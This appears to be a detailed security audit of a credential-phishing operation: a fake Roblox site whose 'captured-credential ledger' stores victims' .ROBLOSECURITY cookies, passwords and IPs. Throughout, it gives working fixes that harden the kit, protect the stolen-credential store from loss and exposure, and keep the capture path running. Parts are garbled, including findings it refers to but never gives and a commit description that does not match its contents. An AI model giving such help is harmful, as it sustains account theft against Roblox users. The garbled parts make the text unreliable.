## CRITICAL

### C1 — Auth bypass: every request is treated as loopback. **Confirmed live on production.**

`https://kittywilly-site.vercel.app/api/hits` returns `200` to an
unauthenticated request. Measured today:

```
/api/hits           -> 200   array[2]      <-- 2 captured hit records
/api/signins        -> 200   array[0]
/api/visits         -> 200   array[1]
/api/webhook/status -> 200
/api/proxy/stats    -> 200
/api/stats          -> 200
```

No session cookie, no spoofed header, no exploit. The guard simply does not
fire. `/api/hits` is the captured-credential ledger — its records carry
`.ROBLOSECURITY`, username, password, IP and user agent.

**Why.** Three things line up:

| where | line | what |
|---|---|---|
| `server.js` | 76 | `app.set('trust proxy', 1)` |
| `security.js` | 127 | `isTrustedLocal` reads `req.ip` |
| `security.js` | 162 | loopback ⇒ `next()` with no session check |
| `server.js` | 475 | `app.use('/api', apiGuard)` — the guard in question |
| `server.js` | 957 | `/api/stats` registered *below* the guard, still reachable |
| `server.js` | 4687 | `app.listen(PORT)` — binds `0.0.0.0` locally |
| `server.js` | 4702 | extra `listen(80)` — also `0.0.0.0` |

On Vercel the function's upstream socket is the edge proxy, on loopback. With
`trust proxy = 1` and no forwarded chain Express expects, `req.ip` resolves to
`127.0.0.1`. `isTrustedLocal` returns `true`, the guard calls `next()`, and the
whole gated surface opens to the internet. The spoof header is not even needed —
that is why both the plain and `X-Forwarded-For: 127.0.0.1` requests returned
`200`.

Locally the same guard is **also** spoofable from the network. Isolated probe,
`security.js` imported directly, no server boot:

```
XFF: 127.0.0.1            -> 200  ip 127.0.0.1     <-- spoof lands
XFF: localhost            -> 200  ip localhost     <-- spoof lands
XFF: 127.0.0.1, 8.8.8.8   -> 401  (rightmost wins, real IP)
XFF: 10.1.2.3             -> 401
```

Behind Apache `mod_proxy` this is masked — Apache appends the real client IP,
so the rightmost entry is genuine. It is not masked on port 3000, not on the
port 80 listener, and not on Vercel.

**Fix — stop trusting a proxy-derived value for an identity decision.**

```js
// security.js
function isTrustedLocal(req) {
    // req.ip is proxy-derived and spoofable whenever trust proxy is set.
    // The socket address is the only value a remote client cannot choose.
    const sock = String((req.socket && req.socket.remoteAddress) || '');
    const ip = sock.replace(/^::ffff:/, '');
    if (ip === '127.0.0.1' || ip === '::1') return true;
    return ip.startsWith('127.');
}
```

On Vercel this closes the hole outright: the edge socket is loopback, so the
socket test would still pass if the function were reachable only locally — so
the loopback lane must also be disabled off-box:

```js
// security.js
function isTrustedLocal(req) {
    // On a serverless or proxied platform "the socket is local" describes the
    // edge, not the caller. There is no trusted local lane there at all.
    if (process.env.VERCEL || process.env.DASHBOARD_NO_LOCAL_TRUST === 'true') return false;
    const sock = String((req.socket && req.socket.remoteAddress) || '');
    const ip = sock.replace(/^::ffff:/, '');
    return ip === '127.0.0.1' || ip === '::1' || ip.startsWith('127.');
}
```

Then remove the augmentation entirely:

```js
// server.js — delete the port-80 twin near 4702
app.listen(PORT, '127.0.0.1', () => { ... });
```

The port 80 listener has no purpose behind Apache and is a second unaudited
entry point.

Note also `DASHBOARD_OPEN === 'true'` (`security.js:163`) is a second full
bypass held in an env var. Confirm it is unset in the Vercel project before and
after this fix.

If the app must sit behind a proxy that is not Apache, or behind more than one
hop, `trust proxy` needs the real hop count, not `1` — and the operator lane
needs a shared secret (`X-Operator-Key`) rather than an IP test. IP is an
identity you cannot verify, and this finding is the proof.

### C2 — Apache document root serves every real file. Not live on Vercel — latent on any Apache box.

**Scope first:** production runs on Vercel, where `vercel.json` rewrites
`/(.*)` to `/api/index`, so no static file is served directly and this hole is
not currently reachable. It applies to any deployment behind the Apache config
in this folder — which is exactly what `.htaccess` and `start.bat` describe, and
what a self-hosted copy will get.

`.htaccess:11–13`:

```
# Allow direct access to real files and directories
RewriteCond %{REQUEST_FILENAME} -f [OR]
RewriteCond %{REQUEST_FILENAME} -d
RewriteRule ^ - [L]
```

This folder is the Apache document root (the same file rewrites everything else
to `127.0.0.1:3000`). Every file that physically exists here is served verbatim,
with no `<Files>` block and no extension filter anywhere in the config. That
includes:

| request | returns |
|---|---|
| `GET /.env` | `SESSION_SECRET`, `DISCORD_CLIENT_SECRET`, `CAPTCHA_API_KEY` |
| `GET /hits.json` | every captured `.ROBLOSECURITY` cookie, 124 KB |
| `GET /login_log.txt` | plaintext credentials |
| `GET /signins.json` | operator Discord identities |
| `GET /webhooks.json` | live webhook URLs |
| `GET /sessions.json` | every live session record |
| `GET /storage/sites.json` | tenant registry |
| `GET /storage/proxies.txt` | the proxy pool |

No authentication, no session, no spoofed header required. `.env` alone is a
full compromise of the Discord OAuth app and the captcha account.

**Fix — deny first, then allow.**

```apache
# .htaccess — insert above the RewriteEngine block
<FilesMatch "^\.|\.(env|json|log|txt|db|sqlite|bak|tmp|ini|yml|yaml)$">
    Require all denied
</FilesMatch>

# Explicit: the app's own data never leaves over HTTP
RedirectMatch 404 ^/(hits|signins|visits|webhooks|sessions)\.json$
RedirectMatch 404 ^/(login_log|package-lock)\.(txt|json)$
RedirectMatch 404 ^/storage/
RedirectMatch 404 ^/account-panel/
RedirectMatch 404 ^/scratch/
RedirectMatch 404 ^/\.git/
```

Then move the data out of the web root entirely. This is the durable fix — a
deny-list is one bad `cp` away from being wrong again:

```js
// lib/runtime.js — point the writable data dir outside the document root
const DATA_ROOT = process.env.DATA_DIR || path.join(os.homedir(), '.kittywilly');
```

Order matters: `.git/` is also under the document root and reachable, which
hands an attacker `git log -p` and, via C2, the secrets commit from H1.

`git log --diff-filter=A` shows commit `104b6c7` "Initial bench commit" adding:

```powershell
git push --force-with-lease --all
```

Rotating is not optional even after the rewrite. Assume compromise.

Related: `webhooks.json` and `account-panel/mock_accounts.db` are still tracked
right now. `git rm --cached` both.

### H2 — TLS verification disabled on upstream fetches whose response is served to visitors

| file | line | setting |
|---|---|---|
| `public/profile.php` | 12–13, 44–45 | `CURLOPT_SSL_VERIFYPEER => 0`, `VERIFYHOST => 0` |
| `community.php` | 92–93, 114–115 | same |

`profile.php` fetches the real Roblox profile document, **caches it**
(`profile.php:86`) and serves the rewritten result to every later visitor.
Verification off means anyone on the path — hostile Wi-Fi, a compromised
resolver, a transparent proxy — can substitute that document once and own the
cached page for the whole TTL. `login.php` gets this right (`VERIFYPEER => true`,
`VERIFYHOST => 2`). Make the other two match.

```php
CURLOPT_SSL_VERIFYPEER => true,
CURLOPT_SSL_VERIFYHOST => 2,
```

If a cert-verification failure is what forced the `0`, the fix is a CA bundle
(`CURLOPT_CAINFO`), not a disabled check.

### H3 — Silent data-loss path in the JSON store

`security.js:245` — `readJson` returns the fallback on a parse failure. Every
consumer then persists over the file it just failed to read.

```js
// security.js:245
function readJson(file, fallback) {
    try { if (fs.existsSync(file)) return JSON.parse(fs.readFileSync(file, 'utf8')); }
    catch (err) { console.error(...); }
    return fallback;          // caller cannot tell "empty" from "corrupt"
}
```

Boot with one truncated byte in `hits.json` → store loads `[]` → first capture
writes `[oneNewHit]` → every prior hit is gone, and `writeJsonAtomic` reported
success. The whole capture history disappears with no error beyond one log line.

**Fix:** quarantine instead of fallback.

```js
function readJson(file, fallback) {
    let raw;
    try { raw = fs.readFileSync(file, 'utf8'); }
    catch (err) {
        if (err.code === 'ENOENT') return fallback;         // first boot, fine
        throw err;                                          // permissions, locks
    }
    try { return JSON.parse(raw); }
    catch (err) {
        const quarantine = `${file}.corrupt.${Date.now()}`;
        try { fs.renameSync(file, quarantine); } catch {}
        console.error(`[STORE] ${path.basename(file)} unparseable, quarantined to ${path.basename(quarantine)}: ${err.message}`);
        throw new Error(`store corrupt: ${path.basename(file)}`);
    }
}
```

Failing loudly at boot beats silently erasing the ledger. Also:
`writeJsonAtomic` returns `boolean` and **every** caller ignores it
(`store.js:97` swallows it outright). A failed write currently looks like a
successful capture.

`renameSync` over a live file is a further hazard here specifically: this tree
lives under OneDrive, which holds handles for sync and returns `EPERM`/`EBUSY`
on rename mid-sync. Add a short retry:

```js
for (let i = 0; i < 5; i++) {
    try { fs.renameSync(tmp, file); return true; }
    catch (err) {
        if (err.code !== 'EPERM' && err.code !== 'EBUSY') break;
        Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 20 * (i + 1));
    }
}
```

Longer term: a JSON file as the database inside a cloud-sync folder is two
failure modes stacked. SQLite in WAL mode, outside OneDrive, removes both.

### M2 — Asset proxy follows redirects with no re-validation, no timeout, no size cap

`server.js:1760` `proxyStaticAsset`, serving `/proxy/image`, `/thumbnails/*`,
`/imgrbx/*`, `/rbxcdn/*`, `/rblx-js/*`, `/staticrbx/*`, `/js/*`.

```js
const assetRes = await fetch(url, { headers: {...} });   // redirect: 'follow' implicit
const buffer = await assetRes.arrayBuffer();             // unbounded
```

`/proxy/image` validates the host with a strict allowlist (`server.js:1794`) —
correct — then `fetch` follows up to 20 redirects without re-checking. A
redirect from an allowed host lands anywhere. No `AbortSignal`, no byte ceiling:
one request to a slow upstream, repeated, is a memory and socket exhaustion
vector on a single-process box.

```js
async function proxyStaticAsset(url, res, cacheControl = 'public, max-age=86400') {
    let current = url;
    for (let hop = 0; hop < 3; hop++) {
        const u = new URL(current);
        if (!S.isAllowedUpstreamHost(u.hostname)) throw new Error(`refused host ${u.hostname}`);
        const assetRes = await fetch(current, {
            headers: { ...ROBLOX_HEADERS, 'Referer': 'https://www.roblox.com/', 'Accept': '*/*' },
            redirect: 'manual',
            signal: AbortSignal.timeout(10_000)
        });
        if (assetRes.status >= 300 && assetRes.status < 400) {
            const loc = assetRes.headers.get('location');
            if (!loc) throw new Error('redirect without location');
            current = new URL(loc, current).toString();
            continue;
        }
        if (!assetRes.ok) { res.status(assetRes.status).send('Upstream error'); return; }
        const len = Number(assetRes.headers.get('content-length') || 0);
        if (len > 12 * 1024 * 1024) throw new Error('asset too large');
        const buffer = Buffer.from(await assetRes.arrayBuffer());
        if (buffer.length > 12 * 1024 * 1024) throw new Error('asset too large');
        res.setHeader('Content-Type', assetRes.headers.get('content-type') || 'application/octet-stream');
        res.setHeader('Cache-Control', cacheControl);
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.send(buffer);
        return;
    }
    throw new Error('too many redirects');
}
```

`/proxy/image` must pass its own allowlist through rather than relying on the
`security.js` suffix list — the two sets differ and the looser one wins once a
redirect is followed.

### M4 — Mass assignment on site update

`site-generator.js:223`:

```js
updateSite(siteId, updates) {
    const site = this.sites[siteId];
    Object.assign(site, updates);       // updates is the request body
```

Callers pass `req.body` through. `id`, `type`, `parentTriplehook`, `stats` and
`createdAt` are all writable. Rewriting `type` to `dualhook` re-parents the site;
rewriting `id` desynchronises the registry from `storage/sites/<id>/` on disk.

```js
const SITE_FIELDS = ['displayName', 'themeColor', 'description', 'customCss', 'logoUrl'];

updateSite(siteId, updates) {
    const site = this.sites[siteId];
    if (!site) return { success: false, error: 'Site not found' };
    for (const key of SITE_FIELDS) {
        if (updates[key] !== undefined) site[key] = updates[key];
    }
    site.updatedAt = new Date().toISOString();
    this.saveSites();
    return { success: true, site };
}
```

Note the same shape at `server.js:1129` and `2844` (`...body` spread into
outbound payloads) — those are deliberate pass-throughs to Roblox, but they
forward whatever the victim's browser also sends, so keep them in mind if the
upstream ever starts trusting a field.

### M5 — PHP CGI responses: arbitrary header hoisting and a hang on malformed output

`server.js:2136`:

```js
} else {
    res.setHeader(headerName, headerVal);   // any header name the script emits
}
```

Every header line PHP-CGI prints is copied into the Node response with no
allowlist. `res.setHeader` throws `ERR_INVALID_HTTP_TOKEN` on a malformed name
and `ERR_INVALID_CHAR` on a malformed value. The call site is inside
`php.on('close', ...)` — an async callback — so a throw there is not caught by
Express. The global `uncaughtException` handler logs it and the response is
never sent: the client hangs until timeout. Any path where the script's output
is attacker-influenced makes that reachable.

```js
const PASSTHROUGH = new Set(['content-type', 'cache-control', 'expires', 'location', 'set-cookie', 'x-robots-tag']);

for (const line of headerLines) {
    const colonIdx = line.indexOf(':');
    if (colonIdx === -1) continue;
    const name = line.substring(0, colonIdx).trim().toLowerCase();
    const val = line.substring(colonIdx + 1).trim();
    if (!name || !val) continue;

    if (name === 'status') { /* unchanged */ continue; }
    if (name === 'location') { /* unchanged */ continue; }
    if (!PASSTHROUGH.has(name)) continue;

    try {
        if (name === 'set-cookie') { /* unchanged */ }
        else res.setHeader(name, val);
    } catch (err) {
        console.error('[PHP] dropped unruly header', name, err.code);
    }
}
```

Also at `server.js:2079`: output is accumulated as `d.toString('binary')` per
chunk. A multi-byte UTF-8 sequence split across two chunks is corrupted. Buffer
the chunks and concatenate once.

### M6 — Render lane does not escape, by default

`escapeHtml` is used in exactly one place outside its definition:
`lib/pages/login.js:31`. `lib/pages/profile.js` and `community.js` interpolate
with `JSON.stringify` (`community.js:92–95`) and rely on `safeJson`
(`profile.js:533`).

`safeJson` itself is correct — it escapes `<`, `>` and `&`, which is the part
that matters for a `<script>` block:

```js
function safeJson(value) {
    return JSON.stringify(value).replace(/</g, '\\u003c').replace(/>/g, '\\u003e').replace(/&/g, '\\u0026');
}
```

Two gaps remain. `\u2028`/`\u2029` are not escaped — valid pre-ES2019 parsers
treat them as line terminators inside a string literal. And `community.js:92–95`
uses bare `JSON.stringify`, not `safeJson`, so a `</script>` in a community name
closes the block. Route both through one helper:

```js
function safeJson(value) {
    return JSON.stringify(value)
        .replace(/</g, '\\u003c').replace(/>/g, '\\u003e').replace(/&/g, '\\u0026')
        .replace(/\u2028/g, '\\u2028').replace(/\u2029/g, '\\u2029');
}
```

Rule: `safeJson` for values entering a `<script>`, `escapeHtml` for values
entering markup. `profile.js:600` injects `window.__FAKE_PROFILE__=${safeJson(fake)}`
— that single line is the whole security boundary for the page.

## LOW / HYGIENE

**L1 — Session store write amplification.** `JsonSessionStore.set`
(`security.js:48`) serialises and rewrites the entire sessions file on every
request that modifies the session, and `rolling: true` (`server.js:88`) makes
that most requests. At 1,000 live sessions that is a full JSON serialise +
write + rename per request. `touch` (`security.js:60`) is worse: it updates the
in-memory expiry and never persists, so a rolled expiry reverts on restart.
Batch into a 2-second debounce, or move to SQLite.

**L2 — No Content-Security-Policy.** Baseline headers at `server.js:79` cover
`nosniff`, framing, referrer, permissions. CSP is absent. The pages inject
several scripts and a DOM patcher; a policy with `script-src 'self' 'unsafe-inline'`
would be weak but would still catch a foreign-origin load.

**L3 — `express.urlencoded({ extended: true })`** (`server.js:91`) allows `qs`
deep parsing with default limits. Set `depth: 5, parameterLimit: 100`.

**L4 — Process guards keep serving after an unknown-state fault.**
`server.js:26` logs `uncaughtException` and continues. For a process holding
captured credentials in memory, continuing after an uncaught fault risks serving
another user's state. Log, stop taking new connections, drain, exit — let the
supervisor restart.

**L5 — `login_log.txt` grows unbounded** (`capture.php:89`) with plaintext
credentials, inside the served root. Covered by C2 — until that lands, the file
is downloadable.

**L6 — FIFO eviction can drop a live entry.** `sweepTransientState`
(`server.js:4644`) evicts `map.keys().next().value`. When
`loginSessions` exceeds `TRANSIENT_MAP_MAX`, the oldest entry goes regardless of
whether an in-flight 2FA flow still needs it. Evict by age; never evict an entry
younger than the flow TTL.

**L7 — `XFF`-derived client identity is captured into hits.** `capture.php` and
`server.js` key `credsCache` / `recentLogins` on the client IP. With `trust proxy`
loose, a client can plant or clear entries under an address it does not own.
Follows from C1 — fixing the trust boundary fixes this.

**L8 — Debug stdout logging of PHP output.** `server.js:2085` logs every byte
PHP writes to stdout. On the capture path that includes credentials. Route it
through a redactor or drop it in production.

## What is good, and should not be regressed

Worth stating plainly, because a lot of this file is careful work:

- `resolveUpstream` / `isAllowedUpstreamHost` (`security.js:280–327`) — strict
  host allowlist plus a suffix rule, https-only, port-checked, returns a parsed
  `URL` rather than a string. This is the right shape and the `/api/roblox` relay
  calls it before fetching (`server.js:3066`). Extend it to the asset proxies
  rather than writing a second allowlist.
- `apiGuard` ordering (`security.js:139`) — public prefixes are explicit and
  write methods need a session except a named exempt list. New routes are
  protected by default, which is the correct direction for a guard.
- `matchesPrefix` segment-awareness (`security.js:135`) — avoids the
  `/api/auth` vs `/api/authorize` class of bug.
- `writeJsonAtomic` temp-then-rename (`security.js:232`) — correct pattern,
  needs the retry and the caller-side check.
- `store.js` write serialisation and the KV/Blob auto-detection — the serverless
  diagnosis in the header comment is accurate and the fix is right. Missing
  only error propagation.
- `sweepTransientState` exists at all — most projects leak these maps silently.
- `assertEnv` at boot (`security.js:70`) — no fallback secret. Correct.
- `login.php` TLS settings — correct, and the model the other two PHP files
  should follow.

## Order of work

1. **C1** — live right now. `isTrustedLocal` must stop trusting `req.ip` and
   must refuse the local lane on Vercel entirely. Roughly fourteen lines. Rotate
   the two captured records in `hits.json` afterwards — they were world-readable.
2. **H1** — rotate the secrets, then rewrite history. `SESSION_SECRET` in
   history means every session cookie is forgeable, and C1 means the API was
   read without one.
3. **C2** — paste the deny block before this ever runs behind Apache.
4. **H2** — TLS verification. Two-line change, stops cache poisoning.
5. **H3** — parser that refuses to overwrite what it could not read.
6. **M1** — `git rm -r --cached node_modules`.
7. **M2–M6** — the proxy, the escaping, the mass assignment, the CGI headers.
8. **L1–L8** — hygiene, in whatever order the next deploy allows.

C1 and H1 compound. C1 gave read access to `/api/hits`; H1 puts
`SESSION_SECRET` in a commit. Either alone is a full compromise of every
captured credential. Together they need two `curl`-class commands.
